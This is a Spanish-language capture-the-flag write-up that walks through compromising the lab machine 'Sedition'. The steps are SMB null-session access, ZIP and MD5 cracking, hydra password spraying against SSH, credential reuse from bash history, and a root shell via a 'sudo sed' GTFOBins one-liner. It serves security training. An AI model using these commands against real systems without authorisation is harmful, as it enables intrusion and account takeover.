# 🏴 Writeup: Sedition — The Hackers Labs

| Campo        | Detalle                          |
|--------------|----------------------------------|
| **Máquina**  | Sedition                         |
| **Plataforma** | The Hackers Labs               |
| **Dificultad** | Principiante                   |
| **SO**       | Linux (Debian 12)                |
| **Fecha**    | 09/04/2026                       |
| **Autor del writeup** | HaRoldCant              |

---

## 🗺️ Cadena de ataque

```
Reconocimiento → Enumeración SMB (null session) → Cracking ZIP → Password Spraying SSH → Bash History → MariaDB → Hash MD5 → Movimiento lateral → sudo sed (GTFOBins) → ROOT
```

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- -sS -sCV --open --min-rate=5000 -n -Pn 192.168.0.20 -oN escaneo
```

**Desglose del comando:**
- `-p-` — escanea los 65535 puertos (no solo los comunes)
- `-sS` — TCP SYN Scan: sigiloso, no completa la conexión, genera menos logs
- `-sCV` — detección de versiones + scripts básicos de reconocimiento
- `--min-rate=5000` — mínimo 5000 paquetes/segundo para mayor velocidad
- `-n` — sin resolución DNS (más rápido y silencioso)
- `-Pn` — sin ping previo (asume que el host está activo)
- `-oN escaneo` — guarda el resultado en un archivo para documentación

**Resultado:**

```
PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
65535/tcp open  ssh         OpenSSH 9.2p1 Debian 2+deb12u6
```

**Análisis:**
- Puertos 139/445 — SMB (Samba). Protocolo de compartición de archivos en red. Vector de ataque habitual en entornos corporativos.
- Puerto 65535 — SSH en puerto no estándar. Técnica llamada *security through obscurity*: el administrador movió el servicio para evitar escaneos superficiales. Ineficaz contra `-p-`.
- `Message signing enabled but not required` — detalle relevante para ataques más avanzados en el futuro.

---

## 📂 2. Enumeración SMB

### Sesión anónima con NetExec

```bash
nxc smb 192.168.0.20 -u '' -p '' --shares
```

- `-u ''` y `-p ''` — credenciales vacías. Intentamos una *null session* (sesión anónima).

**Resultado:**

```
SMB  192.168.0.20  445  SEDITION  (Null Auth:True)
Share        Permissions
-----        -----------
print$       
backup       READ
IPC$         
nobody       
```

**Análisis:** El servidor acepta sesiones anónimas (`Null Auth:True`). El share `backup` tiene permisos de lectura sin autenticación — una misconfiguration grave en cualquier entorno real. Los backups suelen contener información sensible: contraseñas, configuraciones, credenciales hardcodeadas.

### Acceso al share y descarga

```bash
smbclient //192.168.0.20/backup -N
```

- `-N` — sin contraseña (null session)

```bash
smb: \> ls
  secretito.zip   N   216
smb: \> get secretito.zip
```

---

## 🔓 3. Análisis y cracking del ZIP

### Inspección previa

```bash
unzip -l secretito.zip
```

Contiene un único archivo llamado `password` de 22 bytes. Al intentar extraerlo pide contraseña — está cifrado.

### Extracción del hash

```bash
zip2john secretito.zip > hash.txt
```

`zip2john` extrae una representación matemática del cifrado del ZIP (el hash) para trabajarla localmente — sin tocar el objetivo, sin generar logs remotos.

### Cracking con diccionario

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:** `sebastian`

### Extracción del contenido

```bash
unzip secretito.zip
cat password
```

**Contraseña obtenida:** `elbunkermolagollon123`

Tenemos una contraseña pero sin usuario asociado.

---

## 🎯 4. Identificación de usuario — Password Spraying SSH

Con una contraseña conocida y sin usuario, aplicamos *password spraying*: probamos la contraseña fija contra una lista de usuarios. Es menos ruidoso que la fuerza bruta tradicional porque distribuye los intentos entre múltiples cuentas.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
      -p elbunkermolagollon123 \
      ssh://192.168.0.20:65535 \
      -t 40
```

- `-L` — fichero de usuarios (mayúscula = fichero)
- `-p` — contraseña fija (minúscula = una sola)
- `-t 40` — 40 hilos paralelos (agresivo; en entorno real usar `-t 4`)

**Resultado:** `cowboy:elbunkermolagollon123`

---

## 🚪 5. Acceso inicial — SSH

```bash
ssh -p 65535 cowboy@192.168.0.20
```

- `-p 65535` — puerto no estándar

Una vez dentro, primera acción: orientarse.

```bash
whoami && ls -la
```

Hallazgo inmediato: `.bash_history` presente y accesible.

```bash
cat .bash_history
```

**Contenido relevante:**

```
mariadb -u cowboy -pelbunkermolagollon123
su debian
```

El administrador dejó credenciales de base de datos en texto plano en el historial — error crítico de seguridad operacional. Además confirma la existencia del usuario `debian`.

---

## 🗄️ 6. Enumeración de MariaDB

```bash
mariadb -u cowboy -pelbunkermolagollon123
```

```sql
SHOW DATABASES;
USE bunker;
SHOW TABLES;
SELECT * FROM users;
```

**Resultado:**

```
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
```

Hash de 32 caracteres hexadecimales — MD5, el algoritmo más débil y roto de los comunes.

---

## 🔑 7. Cracking del hash MD5

MD5 es tan conocido que existen bases de datos online con millones de hashes precomputados (*rainbow tables*). Búsqueda en CrackStation:

```
7c6a180b36896a0a8c02787eeafb0e4c → password1
```

Resultado instantáneo. Contraseña trivial almacenada con algoritmo obsoleto — doble misconfiguration.

---

## 🔀 8. Movimiento lateral — Usuario debian

```bash
su debian
# contraseña: password1
cd ~
cat flag.txt
```

**Flag de usuario:** `pinguinitopinguinazo` ✅

Revisión del historial de `debian`:

```bash
cat .bash_history
```

Revela el proceso de configuración de la máquina: creación del ZIP cifrado, añadir usuario `cowboy`, intentos repetidos de `sudo su` — confirma que `debian` tiene privilegios sudo.

---

## 👑 9. Escalada de privilegios — sudo sed (GTFOBins)

### Enumeración de privilegios

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/sed
```

`debian` puede ejecutar `sed` como root sin contraseña. `sed` es un editor de flujo de texto legítimo — pero GTFOBins documenta cómo usarlo para obtener una shell.

### Explotación

```bash
sudo sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

**Desglose:**
- `sudo` — ejecución como root
- `sed -n` — modo silencioso
- `'1e exec /bin/sh 1>&0'` — en la línea 1, ejecuta una shell y redirige su salida a nuestra terminal
- `/etc/hosts` — archivo legible siempre presente en el sistema

```bash
whoami
# root
```

### Captura de flag de root

```bash
cat /root/root.txt
```

**Flag de root:** `laflagdelbunkerderootmolagollon` ✅

---

## 📊 Resumen de vulnerabilidades

| Vulnerabilidad | Impacto | Ubicación |
|----------------|---------|-----------|
| SMB null session | Acceso anónimo a recursos | Share `backup` |
| ZIP con contraseña débil | Crackeable con diccionario | `secretito.zip` |
| SSH en puerto no estándar | Security through obscurity ineficaz | Puerto 65535 |
| Credenciales en `.bash_history` | Exposición de contraseñas | Usuario `cowboy` |
| Hash MD5 en base de datos | Crackeable instantáneamente | MariaDB `bunker.users` |
| Contraseña trivial (`password1`) | Sin resistencia a ataques | Usuario `debian` |
| sudo sin contraseña en `sed` | Escalada de privilegios directa | GTFOBins |

---

## 🛠️ Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| Nmap | Reconocimiento y enumeración de puertos |
| NetExec (nxc) | Enumeración SMB con null session |
| smbclient | Acceso y descarga desde share SMB |
| zip2john + John | Extracción y cracking del hash ZIP |
| Hydra | Password spraying sobre SSH |
| MariaDB client | Enumeración de base de datos |
| CrackStation | Cracking de hash MD5 online |
| GTFOBins | Referencia para abuso de `sed` con sudo |

---

## 📚 Conceptos eJPT cubiertos

- Enumeración de servicios con Nmap
- Enumeración SMB y null sessions
- Password cracking con John the Ripper
- Password spraying con Hydra
- Post-explotación y revisión de historial
- Movimiento lateral entre usuarios
- Escalada de privilegios via sudo misconfiguration
- Uso de GTFOBins

---

*Writeup por [HaRoldCant](https://github.com/HaRoldCant) — The Hackers Labs*
